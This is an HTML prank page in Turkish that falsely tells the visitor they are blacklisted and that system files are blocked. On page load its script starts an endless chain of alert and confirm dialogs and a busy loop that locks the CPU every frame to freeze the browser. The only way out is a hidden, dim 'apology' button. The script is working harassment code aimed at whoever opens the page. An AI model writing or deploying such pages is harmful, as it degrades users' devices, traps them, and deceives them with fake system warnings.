<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KARA LİSTE - ERİŞİM REDDEDİLDİ</title>
    <style>
        body {
            background-color: #000;
            color: #ff0000;
            font-family: 'Courier New', Courier, monospace;
            text-align: center;
            overflow: hidden;
            display: flex;
            flex-direction: column;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }
        #warning {
            font-size: 30px;
            font-weight: bold;
            animation: blink 0.5s infinite;
        }
        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0; }
            100% { opacity: 1; }
        }
        .info {
            margin-top: 20px;
            font-size: 18px;
            color: #ccc;
        }
        /* Gizli butonu sadece bilen bulur (Zortmen usulü) */
        #apology-btn {
            background: #222;
            color: #555;
            border: 1px solid #333;
            padding: 5px;
            cursor: pointer;
            position: fixed;
            bottom: 10px;
            right: 10px;
        }
    </style>
</head>
<body>

    <div id="warning">KARA LİSTEDESİN!</div>
    <div class="info">Sistem dosyalarına erişim engellendi...</div>
    <div class="info">Gereksiz işlemler başlatılıyor (FPS: 8)...</div>

    <button id="apology-btn" onclick="stopPunishment()">Özür dilerim (Kurtar beni)</button>

    <script>
        let isPunishing = true;

        // 1. CEZA: Kapatılamayan Uyarı Zinciri
        async function startAnnoyance() {
            while (isPunishing) {
                // X'e bastıkça veya Tamam dedikçe yeni bir tane çıkar
                alert("KARA LİSTE CEZASI: Benden özür dileyene kadar buradasın!");
                
                // Kullanıcıyı bıktıracak onay kutuları
                let response = confirm("Hata kodlarını temizlemek için özür dileyecek misin?");
                if (response) {
                    alert("Sözle yetmez, sağ alttaki gizli butonu bulmalısın!");
                }
            }
        }

        // 2. CEZA: Donanım Kasma (CPU Tüketici)
        function freezeBrowser() {
            if (!isPunishing) return;
            
            // Boş döngü ile tarayıcıyı kilitler (FPS'i 10'un altına çeker)
            let end = Date.now() + 100; // Her karede 100ms kilitler
            while (Date.now() < end) {
                Math.sqrt(Math.random() * 999999);
            }
            
            requestAnimationFrame(freezeBrowser);
        }

        // Kurtuluş yolu
        function stopPunishment() {
            isPunishing = false;
            document.body.innerHTML = "<h1 style='color:green'>CEZA KALDIRILDI. SİSTEME GİRİŞ YAPABİLİRSİN.</h1>";
            setTimeout(() => {
                window.location.href = "https://zortmen.github.io"; // Ana sayfaya at
            }, 2000);
        }

        // Sayfa yüklendiğinde ceza başlasın
        window.onload = () => {
            freezeBrowser();
            // Küçük bir gecikme ile uyarı yağmuru başlar
            setTimeout(startAnnoyance, 1000);
        };
    </script>
</body>
</html>
